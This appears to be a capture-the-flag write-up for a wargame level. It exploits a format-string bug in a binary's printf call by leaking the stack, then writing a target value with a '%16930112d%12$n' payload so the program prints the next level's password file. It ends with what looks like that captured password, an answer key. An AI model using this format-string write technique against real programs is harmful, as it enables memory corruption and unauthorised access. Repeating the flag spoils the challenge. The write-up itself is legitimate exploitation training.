- Let's see how looks ./level4 :

```C
void p(char *param_1)
{
    printf(param_1);
    return;
}

void n(void)
{
    char local_20c [520];
    
    fgets(local_20c,0x200,stdin);
    p(local_20c);
    if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
    }
    return;
}

void main(void)
{
    n();
    return;
}
```

- it's exactly the same process that the level before but instead of overwritting m with 0x40 we have to overwrite it with 0x1025544 (= 16930116)



- Let's leak the stack:

```bash
python3 ./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA f7fa2f94 ff8984d0 f7f67000 ff898564 f7fc6b80 ff898498 804848d ff898290 200 f7f67620 380 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520

Our buffer is at the 12th position on the stack
```


- Let's write a payload like the level before:
```
Address of m = 0x08049810

payload: "\x10\x98\x04\x08" + (16930116 - 4)*"A" + "%12$n"

```

- We see that this payload does not work because the value 16930116 - 4 is too large. here is the trick:

```
payload: "\x10\x98\x04\x08" + "%16930112d%12$n"
```

%16930112d tells printf to actually print 16930112 characters.
While "A"*16930112 is a string passed into printf -> the payload being really large it does not work properly.


```bash
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```